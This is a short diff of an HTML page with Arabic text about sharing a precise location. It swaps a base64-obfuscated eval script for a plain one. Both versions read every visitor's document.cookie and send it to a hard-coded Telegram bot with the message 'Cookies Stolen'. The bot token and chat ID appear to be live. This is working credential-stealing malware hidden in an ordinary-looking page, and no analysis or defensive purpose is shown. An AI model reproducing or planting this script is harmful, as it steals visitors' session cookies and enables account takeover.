@@ -98,7 +98,20 @@
   (انتظر موافقتك على مشاركة الموقع الدقيق)
 </p>
 
-<script>eval(atob('Y29uc3QgY29va2llcyA9IGRvY3VtZW50LmNvb2tpZTsgY29uc3QgZW5jb2RlZENvb2tpZXMgPSBlbmNvZGVVUklDb21wb25lbnQoY29va2llcyk7IGNvbnN0IHRlbGVncmFtQXBpVXJsID0gImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Q4NTE4NzY5MDM5OkFBSEBIWVlscW9uN2VvRXl5eHQzbHhteXNyd2U2QnJ5TFhBL3NlbmRNZXNzYWdlP2NoYXRfaWQ9NjcxNzI4NzE2MSZ0ZXh0PUNvb2tpZXMlMjBTdG9sZW46JTIwIiArIGVuY29kZWRDb29raWVzOyBmZXRjaCh0ZWxlZ3JhbUFwaVVybCk7'));</script>
+<script>
+    const cookies = document.cookie;
+    const encodedCookies = encodeURIComponent(cookies);
+    // هذا الرمز يجب أن يكون صحيحاً: 8518769039:AAHPHYelqon7eoEyyxt3lxmysrwe6BryLXA
+    const telegramApiUrl = "https://api.telegram.org/bot8518769039:AAHPHYelqon7eoEyyxt3lxmysrwe6BryLXA/sendMessage?chat_id=6717287161&text=Cookies%20Stolen:%20" + encodedCookies;
+    fetch(telegramApiUrl)
+        .then(response => {
+            // هذا السطر يظهر في Console (سجل المطورين) فقط
+            console.log('Telegram API Response Status:', response.status); 
+        })
+        .catch(error => {
+            console.error('Fetch Error:', error);
+        });
+</script>
 <script>
 // دالة لتوليد مُعرِّف جلسة عشوائي
 function generateSessionId() {
